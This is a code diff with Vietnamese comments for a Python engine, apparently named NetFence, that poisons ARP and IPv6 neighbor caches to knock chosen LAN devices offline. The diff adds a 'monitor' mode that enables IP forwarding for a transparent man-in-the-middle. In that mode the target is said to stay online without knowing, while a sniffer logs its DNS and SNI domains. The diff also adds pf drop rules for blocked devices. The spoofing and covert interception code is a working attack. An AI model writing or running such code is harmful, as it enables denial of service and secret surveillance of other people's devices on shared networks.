@@ -9,16 +9,23 @@ khung ARP (IPv4) và ICMPv6 (IPv6) tới thiết bị đích trên LAN để duy
       + Cứ mỗi 1 giây (hoặc theo interval_ms) lại phát tiếp loạt gói tin chặn.
       + Dù người dùng tắt Wi-Fi bật lại, ngay khi vừa kết nối là bị đè chặn ngay lập tức.
 
-  - IPv4 Block (2 chiều):
+  - IPv4 Block (2 chiều) - CHỈ nhắm đúng thiết bị đích, KHÔNG ảnh hưởng máy khác:
       + Gửi ARP Reply & Request unicast tới Target: Gateway IP nằm ở our_mac.
-      + Gửi ARP Reply broadcast: Thông báo toàn mạng Gateway nằm ở our_mac.
-      + Gửi ARP Reply & Request tới Gateway: Target IP nằm ở our_mac.
+      + Gửi ARP Reply & Request unicast tới Gateway: Target IP nằm ở our_mac.
+      + KHÔNG dùng ARP broadcast (tránh làm hỏng ARP cache của toàn mạng).
       + Vô hiệu hoá net.inet.ip.redirect=0 để macOS KHÔNG sinh gói ICMP Redirect.
 
-  - IPv6 Block (ICMPv6 NDP NA + RA):
-      + Gửi ICMPv6 Router Advertisement (RA) chuẩn RFC 2464 tới 33:33:00:00:00:01 (ff02::1)
-        với Router Lifetime = 0 -> Huỷ quyền làm default router của Gateway IPv6.
-      + Gửi ICMPv6 Neighbor Advertisement (NA) với cờ Router=1, Override=1.
+  - IPv6 Block (ICMPv6 NDP NA + RA) - CHỈ nhắm đúng thiết bị đích (L2 unicast tới MAC target):
+      + Gửi ICMPv6 Router Advertisement (RA) với Router Lifetime = 0 -> chỉ target huỷ
+        default router của Gateway IPv6 (không multicast tới ff02::1 nữa).
+      + Gửi ICMPv6 Neighbor Advertisement (NA) với cờ Router=1, Override=1 tới MAC target
+        để đầu độc neighbor cache: Gateway IPv6 -> our_mac.
+
+  - Chế độ GIÁM SÁT (mode="monitor" trong request.json): vẫn đầu độc ARP/NDP như trên,
+    nhưng BẬT net.inet.ip.forwarding=1 để máy này chuyển tiếp gói tin (MITM trong suốt):
+    máy đích vẫn dùng mạng bình thường, không hề hay biết; dhcp_sniffer.py sẽ ghi lại
+    DNS/SNI của máy đó vào domains.json. Khi không còn thiết bị giám sát -> tự tắt
+    forwarding lại.
 
   - Thống kê thời gian thực:
       + Đếm số đợt phát (ticks) và số gói tin (packets) ghi vào status.json để Web UI hiển thị.
@@ -193,6 +200,11 @@ class Engine:
         self.applied_gen = -1
         self.total_ticks = 0
         self.total_packets = 0
+        self.monitored: set[str] = set()    # ip đang ở chế độ giám sát (MITM trong suốt)
+        self.forwarding_on = False
+        self.pf_blocked: list[str] = []     # ip bị chặn đang có rule drop trong pf
+        self.pf_iface = ""
+        self.pf_ok = False                  # pf đã load & verify thành công
 
     # -- Chặn / Khôi phục ---------------------------------------------------
     def _poison(self, target_ip: str, target_mac: str) -> None:
@@ -201,27 +213,26 @@ class Engine:
         omac = self.our_mac
         pkts = []
 
-        # 1. IPv4 2 chiều (Bidirectional Poisoning):
+        # 1. IPv4 2 chiều (Bidirectional Poisoning) - CHỈ NHẮM ĐÚNG TARGET (unicast):
         # - Báo Target: Gateway_IP nằm ở our_mac (Reply unicast + Request)
         pkts.append(build_arp(ARP_OP_REPLY, omac, self.gw_ip, tmac, tip))
         pkts.append(build_arp(ARP_OP_REQUEST, omac, self.gw_ip, tmac, tip))
-        # - Phát sóng Gratuitous ARP announcement cho Gateway
-        pkts.append(build_arp(ARP_OP_REPLY, omac, self.gw_ip, ETH_BROADCAST, self.gw_ip))
-        # - Báo Gateway: Target_IP nằm ở our_mac (Reply + Request)
+        # - Báo Gateway: Target_IP nằm ở our_mac (Reply + Request unicast tới gateway)
         pkts.append(build_arp(ARP_OP_REPLY, omac, tip, self.gw_mac, self.gw_ip))
         pkts.append(build_arp(ARP_OP_REQUEST, omac, tip, self.gw_mac, self.gw_ip))
+        # LƯU Ý: Đã BỎ gói ARP Reply broadcast (ETH_BROADCAST) trước đây vì nó thông báo
+        # "Gateway = our_mac" tới TOÀN MẠNG, khiến mọi thiết bị (kể cả không bị chặn) mất mạng.
+        # 4 gói unicast trên đã đủ cô lập target 2 chiều; re-poison mỗi 1s duy trì trạng thái.
 
-        # 2. IPv6 Poisoning (nếu mạng có IPv6):
+        # 2. IPv6 Poisoning (nếu mạng có IPv6) - CHỈ NHẮM ĐÚNG TARGET (L2 unicast tới tmac):
         if self.gw_ip6:
             try:
-                # - ICMPv6 RA gửi chuẩn multicast (33:33:00:00:00:01) với Router Lifetime = 0
-                # Bất kỳ thiết bị nào vừa bật Wi-Fi lại nhận được gói này sẽ lập tức huỷ default route IPv6
-                pkts.append(build_icmpv6_ra_frame(ETH_IPV6_ALLNODES, omac, self.gw_ip6,
+                # - ICMPv6 RA (Router Lifetime = 0) gửi L2-unicast tới target -> chỉ target
+                #   huỷ default route IPv6 của gateway, KHÔNG đụng máy khác.
+                pkts.append(build_icmpv6_ra_frame(tmac, omac, self.gw_ip6,
                                                  "ff02::1", router_lifetime=0))
-                # - ICMPv6 NA gửi multicast gán IPv6 Gateway về our_mac (Override=1)
-                pkts.append(build_icmpv6_na_frame(ETH_IPV6_ALLNODES, omac, self.gw_ip6,
-                                                 "ff02::1", self.gw_ip6, omac, 0xa0000000))
-                # - ICMPv6 unicast trực tiếp tới MAC của Target
+                # - ICMPv6 NA đầu độc neighbor cache: gán IPv6 Gateway -> our_mac (Override=1),
+                #   gửi L2-unicast trực tiếp tới MAC của Target. Đây là cơ chế chặn IPv6 thực sự.
                 pkts.append(build_icmpv6_na_frame(tmac, omac, self.gw_ip6,
                                                  "ff02::1", self.gw_ip6, omac, 0xa0000000))
             except Exception:
@@ -245,10 +256,10 @@ class Engine:
             self.sender.send(build_arp(ARP_OP_REPLY, self.gw_mac, self.gw_ip, tmac, tip))
             self.sender.send(build_arp(ARP_OP_REPLY, tmac, tip, self.gw_mac, self.gw_ip))
 
-            # Khôi phục IPv6:
+            # Khôi phục IPv6 - cũng chỉ gửi tới đúng target (L2 unicast), không đụng máy khác:
             if self.gw_ip6:
                 try:
-                    f_ra = build_icmpv6_ra_frame(ETH_IPV6_ALLNODES, self.gw_mac, self.gw_ip6,
+                    f_ra = build_icmpv6_ra_frame(tmac, self.gw_mac, self.gw_ip6,
                                                 "ff02::1", router_lifetime=1800)
                     f_na = build_icmpv6_na_frame(tmac, self.gw_mac, self.gw_ip6, "ff02::1",
                                                 self.gw_ip6, self.gw_mac, 0xa0000000)
@@ -257,6 +268,63 @@ class Engine:
                 except Exception:
                     pass
             time.sleep(0.04)
+
+    # -- pf firewall: drop traffic của thiết bị bị CHẶN ---------------------
+    def _pf_sync(self) -> None:
+        """Load rule pf drop cho các thiết bị bị chặn vào MAIN ruleset.
+
+        BẮT BUỘC khi forwarding=1 (có thiết bị giám sát): nếu không, gói tin của
+        target bị chặn sẽ bị kernel forward qua gateway bình thường thay vì bị
+        black-hole, khiến "chặn" mất tác dụng.
+
+        LƯU Ý: load thẳng main ruleset (pfctl -f -) thay vì anchor — rule trong
+        anchor KHÔNG bao giờ được đánh giá nếu main ruleset không có dòng
+        `anchor "..."` tham chiếu tới nó (macOS mặc định không có)."""
+        import subprocess
+        blocked = sorted(ip for ip, v in self.active.items() if v.get("mode") == "block")
+        if (blocked == self.pf_blocked and self.iface == self.pf_iface
+                and self.pf_ok):
+            return
+        self.pf_blocked = blocked
+        self.pf_iface = self.iface
+        self.pf_ok = False
+        try:
+            rules = "set skip on lo0\n"
+            if blocked:
+                ips = ", ".join(blocked)
+                rules += (
+                    f'table <netfence_blocked> {{ {ips} }}\n'
+                    f'block drop quick on {self.iface} from <netfence_blocked> to any\n'
+                    f'block drop quick on {self.iface} from any to <netfence_blocked>\n'
+                )
+            r = subprocess.run(["pfctl", "-f", "-"], input=rules.encode(),
+                               capture_output=True, timeout=5)
+            if r.returncode != 0:
+                print(f"[pf] load lỗi: {r.stderr.decode(errors='ignore').strip()}",
+                      file=sys.stderr, flush=True)
+                return
+            # Tự verify: rule phải thực sự nằm trong ruleset đang chạy
+            v = subprocess.run(["pfctl", "-s", "rules"], capture_output=True, timeout=5)
+            out = v.stdout
+            self.pf_ok = ((b"block drop" in out and b"netfence_blocked" in out)
+                          if blocked else b"block drop" not in out)
+            if not self.pf_ok:
+                print(f"[pf] verify thất bại, ruleset: {out.decode(errors='ignore').strip()}",
+                      file=sys.stderr, flush=True)
+        except Exception:
+            pass
+
+    # -- IP forwarding (chế độ giám sát) ------------------------------------
+    def _update_forwarding(self) -> None:
+        """Bật IP forwarding khi có ít nhất 1 thiết bị đang giám sát (MITM trong
+        suốt — máy đích vẫn online bình thường qua máy này), tắt khi không còn."""
+        want = bool(self.monitored)
+        if want and not self.forwarding_on:
+            os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1")
+            self.forwarding_on = True
+        elif not want and self.forwarding_on:
+            os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")
+            self.forwarding_on = False
 
     # -- Quản lý State ------------------------------------------------------
     def _read_request(self):
@@ -275,6 +343,10 @@ class Engine:
             "gateway_ip6": self.gw_ip6,
             "gateway_locked": getattr(self, "gateway_locked", False),
             "active": sorted(self.active.keys()),
+            "monitoring": sorted(self.monitored),
+            "forwarding": self.forwarding_on,
+            "pf_blocking": list(self.pf_blocked),
+            "pf_ok": self.pf_ok,
             "applied_generation": self.applied_gen,
             "total_ticks": self.total_ticks,
             "total_packets": self.total_packets,
@@ -312,6 +384,7 @@ class Engine:
             iv = int(e.get("interval_ms", 1000))
             iv = max(50, min(5000, iv))
             wanted[ip] = {"mac": mac, "interval_ms": iv,
+                          "mode": e.get("mode", "block"),
                           "last_sent": self.active.get(ip, {}).get("last_sent", 0.0)}
 
         # Thiết bị vừa được bỏ block -> khôi phục
@@ -319,6 +392,9 @@ class Engine:
             if ip not in wanted:
                 self._restore(ip, self.active[ip]["mac"])
         self.active = wanted
+        self.monitored = {ip for ip, v in wanted.items() if v.get("mode") == "monitor"}
+        self._update_forwarding()
+        self._pf_sync()
         self.applied_gen = req.get("generation", self.applied_gen)
         # Tự động khóa tĩnh ARP Gateway để bảo vệ máy khỏi bị đầu độc (Auto-Defense)
         gw_ip_str = req.get("gateway_ip", "")
@@ -356,6 +432,11 @@ class Engine:
 
     def shutdown(self, note: str = "shutdown") -> None:
         os.system("sysctl -w net.inet.ip.redirect=1 >/dev/null 2>&1")
+        if self.forwarding_on:
+            os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")
+            self.forwarding_on = False
+        # Khôi phục ruleset rỗng (pass-all) — gỡ mọi rule drop của NetFence
+        os.system("printf 'set skip on lo0\\n' | pfctl -f - >/dev/null 2>&1")
         if getattr(self, "gateway_locked", False) and getattr(self, "gw_ip_str", ""):
             try:
                 import subprocess
@@ -375,9 +456,22 @@ class Engine:
             self._write_status(False, "cần chạy bằng root")
             print("NetFence engine cần quyền root.", file=sys.stderr)
             return 1
-        
+       
+        try:
+            os.chdir("/")   # CWD kế thừa có thể đã bị xoá -> shell-init lỗi mỗi os.system
+        except OSError:
+            pass
+
         os.system("sysctl -w net.inet.ip.redirect=0 >/dev/null 2>&1")
         os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")
+        try:
+            import subprocess
+            r = subprocess.run(["pfctl", "-e"], capture_output=True, timeout=5)
+            print(f"[pf] enable: rc={r.returncode} "
+                  f"{(r.stdout + r.stderr).decode(errors='ignore').strip()}",
+                  file=sys.stderr, flush=True)
+        except Exception as e:
+            print(f"[pf] enable exception: {e}", file=sys.stderr, flush=True)
 
         last_status = 0.0
         missing_since = None
@@ -403,7 +497,7 @@ class Engine:
                             self._apply(req)
                         except Exception as e:
                             self._write_status(True, f"apply lỗi: {e}")
-                
+
                 # Bắn liên tục theo chu kỳ mỗi 1 giây
                 if self.active and self.sender:
                     self._tick_send()
